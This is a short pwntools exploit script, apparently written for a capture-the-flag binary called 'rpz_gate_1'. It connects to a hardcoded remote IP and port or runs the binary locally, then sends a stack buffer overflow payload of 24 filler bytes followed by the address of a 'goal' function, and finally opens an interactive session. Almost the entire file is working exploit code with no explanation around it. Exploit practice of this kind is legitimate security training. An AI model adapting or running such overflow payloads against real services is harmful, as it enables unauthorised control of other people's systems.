#!/usr/bin/python3

from pwn import *

exe = ELF('rpz_gate_1', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x0000000000401644

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('94.237.59.185', 44848)
else:
        p = process(exe.path)

GDB()
sla(b'(y/n): ',b'n')
sla(b'>> ','1')
sla(b'(y/n): ',b'b'*24 + p64(exe.sym.goal))
p.interactive()
